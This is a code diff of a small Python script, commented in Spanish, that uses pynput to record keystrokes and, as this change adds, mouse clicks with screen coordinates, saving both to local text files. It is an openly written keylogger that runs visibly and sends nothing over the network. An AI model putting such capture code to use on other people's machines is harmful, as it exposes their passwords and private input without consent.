@@ -1,13 +1,20 @@
-from pynput import keyboard
+from pynput import keyboard, mouse
 
-# Ruta del archivo de texto para almacenar las teclas presionadas
-file_path = "teclas1.txt"
+# Ruta del archivo de texto para almacenar las teclas presionadas y los clics
+file_path = "teclas.txt"
+file_path_muse = "clicks.txt"
 
-# Lista para almacenar las teclas presionadas
+# Lista para almacenar las teclas presionadas y clics
 teclas_presionadas = []
+clics = []
 
 # Bandera para controlar la captura de teclas
 captura_activa = True
+
+
+def on_click(x, y, button, pressed):
+    if pressed and captura_activa:
+        clics.append(f"Mouse Click: Coordenadas: ({x}, {y}), Botón: {button}")
 
 # Función para manejar los eventos de pulsaciones de teclado
 def on_press(key):
@@ -23,9 +30,13 @@ def on_press(key):
     if key == keyboard.Key.ctrl and tecla == 'c':
         captura_activa = False
 
+# Crear los objetos Listener para el mouse y el teclado
+mouse_listener = mouse.Listener(on_click=on_click)
 # Crear el objeto Listener para el teclado
 keyboard_listener = keyboard.Listener(on_press=on_press)
 
+# Iniciar la escucha de eventos del mouse
+mouse_listener.start()
 # Iniciar la escucha de eventos del teclado
 keyboard_listener.start()
 
@@ -40,12 +51,15 @@ except KeyboardInterrupt:
     captura_activa = False
 
 # Detener la captura (esto se ejecutará después de presionar "Ctrl + C")
+mouse_listener.stop()
 keyboard_listener.stop()
 
 # Guardar las teclas presionadas en el archivo
 try:
     with open(file_path, "a") as file:
         file.write("\n".join(teclas_presionadas))
-    print("\033[38;5;88mCaptura finalizada. Las teclas presionadas se han almacenado en el archivo:", file_path)
+    with open(file_path_muse, "w") as file:
+        file.write("\n".join(clics))
+    print("\033[38;5;88mCaptura finalizada. Las teclas presionadas se han almacenado en el archivo:", file_path, file_path_muse)
 except Exception as e:
     print("Ocurrió un error al guardar las teclas presionadas:", str(e))
